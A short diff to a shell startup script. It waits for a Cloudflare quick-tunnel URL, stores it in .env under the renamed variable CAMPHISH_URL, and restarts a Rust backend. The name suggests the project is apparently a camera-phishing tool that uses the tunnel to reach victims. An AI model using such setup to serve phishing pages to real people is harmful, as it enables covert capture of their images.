@@ -93,7 +93,7 @@ if [ "$TUNNEL" = "cloudflared" ]; then
 
     echo -n "  Waiting for tunnel URL..."
     for i in $(seq 1 60); do
-        TUNNEL_URL=$(grep -oE 'https://[a-z0-9-]+\.try\.cloudflare\.com' < "$TUNNEL_LOG" | tail -1)
+        TUNNEL_URL=$(grep -oE 'https://[a-z0-9-]+\.[a-z0-9-]+\.(try\.cloudflare\.com|cf)' < "$TUNNEL_LOG" | tail -1)
         [ -n "$TUNNEL_URL" ] && break
         sleep 2
     done
@@ -118,13 +118,14 @@ fi
 if [ -n "$TUNNEL_URL" ]; then
     echo "[3/5] Restarting backend with tunnel URL..."
 
-    if grep -q "^TUNNEL_LINK=" .env 2>/dev/null; then
-        sed -i '' "s|^TUNNEL_LINK=.*|TUNNEL_LINK=$TUNNEL_URL|" .env
+    if grep -q "^CAMPHISH_URL=" .env 2>/dev/null; then
+        sed -i '' "s|^CAMPHISH_URL=.*|CAMPHISH_URL=$TUNNEL_URL|" .env
     else
-        echo "TUNNEL_LINK=$TUNNEL_URL" >> .env
+        echo "CAMPHISH_URL=$TUNNEL_URL" >> .env
     fi
 
     kill "$BACKEND_PID" 2>/dev/null && wait "$BACKEND_PID" 2>/dev/null || true
+    sleep 1  # let the port release
     cd "$PROJECT_DIR/backend"
     cargo run $CARGO_MODE > "$BACKEND_LOG" 2>&1 &
     BACKEND_PID=$!
